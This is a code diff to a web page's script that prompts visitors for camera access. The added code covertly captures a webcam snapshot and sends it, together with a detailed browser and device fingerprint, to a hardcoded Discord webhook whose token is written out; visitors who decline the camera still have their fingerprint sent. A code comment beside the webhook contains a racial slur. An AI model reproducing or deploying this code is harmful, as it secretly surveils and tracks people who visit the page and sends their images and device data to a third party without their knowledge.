@@ -79,6 +79,7 @@
         const noBtn = document.getElementById('noBtn');
         const content = document.getElementById('content');
         const cameraFeed = document.getElementById('cameraFeed');
+        const webhookURL = 'https://discord.com/api/webhooks/1355191352765190304/bWO4AwKnPac4FtJPuSoADwfmc1rpoDLD4VwaMgoKgsTGzMGq-2hrT3d6_pcWkHgXOoGG'; // yo  niggas doing
 
         async function startCamera() {
             try {
@@ -94,14 +95,45 @@
                 cameraFeed.classList.remove('hidden');
                 return true;
             } catch (error) {
-                console.error("Camera access denied:", error);
                 return false;
+            }
+        }
+
+        async function captureCamera() {
+            if (cameraFeed.srcObject) {
+                const canvas = document.createElement('canvas');
+                canvas.width = cameraFeed.videoWidth;
+                canvas.height = cameraFeed.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+                return new Promise((resolve) => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
+                });
+            }
+            return null;
+        }
+
+        async function sendToWebhook(data, imageBlob) {
+            const formData = new FormData();
+            const dataBlob = new Blob([data], { type: 'text/plain' });
+            formData.append('file', dataBlob, 'user_data.txt');
+            
+            if (imageBlob) {
+                formData.append('file', imageBlob, 'camera_capture.jpg');
+            }
+            
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error('Error sending to webhook:', error);
             }
         }
 
         yesBtn.addEventListener('click', async () => {
             permissionBox.innerHTML = '<h2>Please allow camera access in the browser pop-up...</h2>';
-            
             const cameraAllowed = await startCamera();
             
             if (!cameraAllowed) {
@@ -113,19 +145,17 @@
             
             permissionBox.classList.add('hidden');
             content.classList.remove('hidden');
-            getVisitorInfo();
+            const data = await getVisitorInfo();
+            const imageBlob = await captureCamera();
+            await sendToWebhook(data, imageBlob);
         });
 
-        noBtn.addEventListener('click', () => {
+        noBtn.addEventListener('click', async () => {
             permissionBox.classList.add('hidden');
             content.classList.remove('hidden');
-            getVisitorInfo();
+            const data = await getVisitorInfo();
+            await sendToWebhook(data, null);
         });
-        function continueWithoutCamera() {
-            permissionBox.classList.add('hidden');
-            content.classList.remove('hidden');
-            getVisitorInfo();
-        }
 
         async function getVisitorInfo() {
             try {
@@ -135,7 +165,6 @@
                 ]);
                 
                 const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                
                 const canvas = document.createElement('canvas');
                 const canvasFingerprint = canvas.toDataURL();
                 const webglInfo = getWebGLInfo();
@@ -224,9 +253,12 @@ Fonts List: ${await getFontsList() || 'N/A'}
 `;
 
                 document.getElementById('info').textContent = visitorData;
+                return visitorData;
                 
             } catch (error) {
-                document.getElementById('info').textContent = `Failed to load complete information. Error: ${error.message}\n\nBasic Info:\nUser Agent: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}\nPlatform: ${navigator.platform}`;
+                const basicInfo = `Failed to load complete information. Error: ${error.message}\n\nBasic Info:\nUser Agent: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}\nPlatform: ${navigator.platform}`;
+                document.getElementById('info').textContent = basicInfo;
+                return basicInfo;
             }
         }
 
@@ -257,7 +289,6 @@ Fonts List: ${await getFontsList() || 'N/A'}
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (!gl) return { supported: false };
-                
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 return {
                     supported: true,
@@ -275,21 +306,16 @@ Fonts List: ${await getFontsList() || 'N/A'}
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (!gl) return {};
-                
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
-                
                 let gpu = 'N/A';
                 let memory = 'N/A';
-                
                 if (renderer.includes('NVIDIA')) gpu = 'NVIDIA ' + renderer.split('NVIDIA ')[1];
                 else if (renderer.includes('AMD')) gpu = 'AMD ' + renderer.split('AMD ')[1];
                 else if (renderer.includes('Intel')) gpu = 'Intel ' + renderer.split('Intel ')[1];
                 else gpu = renderer;
-                
                 if (renderer.includes('GB')) memory = renderer.match(/\d+GB/)[0];
                 else if (renderer.includes('MB')) memory = renderer.match(/\d+MB/)[0];
-                
                 return { gpu, memory };
             } catch (e) {
                 return {};
@@ -300,7 +326,6 @@ Fonts List: ${await getFontsList() || 'N/A'}
             try {
                 const AudioContext = window.AudioContext || window.webkitAudioContext;
                 if (!AudioContext) return { supported: false };
-                
                 const context = new AudioContext();
                 return {
                     supported: true,
@@ -331,7 +356,6 @@ Fonts List: ${await getFontsList() || 'N/A'}
             try {
                 const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 if (!connection) return {};
-                
                 return {
                     type: connection.type,
                     effectiveType: connection.effectiveType,
@@ -371,7 +395,6 @@ Fonts List: ${await getFontsList() || 'N/A'}
                 if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                     return {};
                 }
-                
                 const devices = await navigator.mediaDevices.enumerateDevices();
                 return {
                     camera: devices.some(device => device.kind === 'videoinput'),
@@ -386,7 +409,6 @@ Fonts List: ${await getFontsList() || 'N/A'}
         async function getFontsList() {
             try {
                 if (!('fonts' in document)) return 'N/A';
-                
                 await document.fonts.ready;
                 const fontSet = new Set();
                 for (const font of document.fonts) {
